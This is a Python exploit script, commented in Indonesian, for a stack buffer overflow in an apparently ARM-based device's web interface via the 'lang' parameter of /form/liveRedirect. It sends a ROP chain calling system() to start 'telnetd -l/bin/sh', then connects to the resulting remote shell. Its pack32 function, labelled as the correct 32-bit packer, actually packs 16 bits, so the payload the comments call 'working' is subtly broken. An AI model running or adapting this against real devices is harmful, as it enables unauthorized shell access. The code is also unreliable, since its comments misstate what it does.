#!/usr/bin/python3
from telnetlib import Telnet
import struct, sys, socket
import time

# ========== FUNGSI UTAMA YANG DIPERBAIKI ==========
def pack32(value):
    """Fungsi yang BENAR untuk pack 32-bit ARM little endian"""
    return struct.pack("H", value)

# ========== KONFIGURASI EKSPLOIT ==========
# PASTIKAN NILAI INI BENAR UNTUK TARGET ANDA!
LIBRARY_BASE = 0x40021000
BUFFER_OFFSET = 284
GADGET_ADDR = 0x40060b58     # Gadget: ldr r0, [sp, #4]; pop {r1, r2, r3, lr}; bx lr;
SYSTEM_ADDR = 0x4006079c     # Address system()
MOV_R0_SP = 0x00033a98       # mov r0, sp; mov lr, pc; bx r3;

# ========== BUILD PAYLOAD YANG WORKING ==========
def build_working_payload():
    payload = b""
    
    # 1. Buffer overflow
    payload += b"A" * BUFFER_OFFSET
    
    # 2. ROP Chain (ARM little endian)
    payload += pack32(GADGET_ADDR)        # Gadget 1
    payload += b"BBBB"                    # Padding [sp+4]
    payload += b"R1R1"                    # r1
    payload += b"R2R2"                    # r2
    payload += pack32(SYSTEM_ADDR)        # r3
    payload += pack32(LIBRARY_BASE + MOV_R0_SP)  # lr
    
    # 3. Command injection
    payload += b"telnetd -l/bin/sh;"      # PASTIKAN tidak ada bad chars
    
    return payload

# ========== EKSEKUSI EKSPLOIT ==========
def run_exploit(ip, port):
    print("[+] Membuat payload...")
    payload = build_working_payload()
    
    print("[+] Membuat HTTP request...")
    request = b"GET /form/liveRedirect?lang=" + payload + b" HTTP/1.1\r\n"
    request += b"Host: " + ip.encode() + b"\r\n"
    request += b"Connection: close\r\n\r\n"
    
    print(f"[+] Mengirim ke {ip}:{port}...")
    try:
        s = socket.socket()
        s.settimeout(10)
        s.connect((ip, int(port)))
        s.send(request)
        print("[!] Payload terkirim!")
        
        time.sleep(3)  # Beri waktu untuk telnetd start
        
        print("[+] Mencoba akses shell via telnet...")
        tn = Telnet(ip, 23)
        print("[+] Berhasil! Masuk ke shell:")
        tn.interact()
    except Exception as e:
        print(f"[-] Gagal: {e}")
        print("[!] Coba konek manual: telnet " + ip)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: ./exploit.py  ")
        sys.exit()
    
    run_exploit(sys.argv[1], sys.argv[2])